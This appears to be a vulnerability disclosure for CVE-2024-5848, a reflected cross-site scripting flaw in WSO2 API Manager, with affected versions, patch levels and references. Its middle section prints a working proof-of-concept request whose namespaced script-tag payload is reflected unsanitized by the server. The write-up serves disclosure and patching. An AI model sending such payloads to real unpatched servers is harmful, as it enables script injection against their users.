# CVE-2024-5848

WSO2 API Manager - Reflected Cross-Site Scripting (XSS)

## Timeline

* Vulnerability reported to vendor: 01.05.2024
* Public disclosure: 10.11.2024

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability has been reported in WSO2 API Manager. This flaw occurs because user-supplied data is passed directly into the server response of a vulnerable services endpoint without sufficient validation, sanitization, or encoding.

A malicious actor can leverage this vulnerability by injecting a malicious payload to execute scripts within the victim's browser. This could allow the attacker to redirect the browser to a malicious website, modify the UI of the web page, or retrieve sensitive information from the browser. However, because session-related sensitive cookies are protected with the `httpOnly` flag, session hijacking or similar attacks are mitigated. The impact is further reduced if the service endpoint is restricted at the gateway level.

The vulnerability can be exploited by sending a `POST` request to the vulnerability `service` endpoint with an XML payload containing a malicious script tag.

**Request:**

```http
POST /service HTTP/2
Host: [REDACTED]
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept-Language: en-US,en;q=0.5
Content-Type: text/xml; charset=UTF-8
Upgrade-Insecure-Requests: 1
Content-Length: 164

<html>
	<head></head>
	<body>
		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.domain)</something:script>
	</body>
</html>

```

The server reflects the unsanitized input back to the user, resulting in XSS execution.

**Response:**

```http
HTTP/2 200 OK
Server: nginx
Date: Thu, 25 Apr 2024 17:23:08 GMT
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.5
Upgrade-Insecure-Requests: 1
Accept: */*

<html>
	<head/>
	<body>
		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.domain)</something:script>
	</body>
</html>

```

## Affected versions

* WSO2 API Manager: 4.3.0, 4.2.0, 4.1.0, 4.0.0, 3.2.1, 3.2.0, 3.1.0
* WSO2 Open Banking AM: 2.0.0

## Advisory

WSO2 has addressed this issue in the following update levels:

* WSO2 API Manager 4.3.0: Update Level 10
* WSO2 API Manager 4.2.0: Update Level 92
* WSO2 API Manager 4.1.0: Update Level 160
* WSO2 API Manager 4.0.0: Update Level 300
* WSO2 API Manager 3.2.1: Update Level 10
* WSO2 API Manager 3.2.0: Update Level 375
* WSO2 API Manager 3.1.0: Update Level 285
* WSO2 Open Banking AM 2.0.0: Update Level 349

Community users (Open Source) should apply the public fixes provided in the official repository. If applying the fix or update is not feasible, users should migrate to the latest unaffected version or apply the suggested manual configuration to the `OpenService.xml` file.

### References

* [https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3450/](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3450/)
* [https://github.com/wso2/product-apim/pull/13501](https://github.com/wso2/product-apim/pull/13501)
* [https://nvd.nist.gov/vuln/detail/CVE-2024-5848](https://nvd.nist.gov/vuln/detail/CVE-2024-5848)
* [https://www.cve.org/CVERecord?id=CVE-2024-5848](https://www.cve.org/CVERecord?id=CVE-2024-5848)
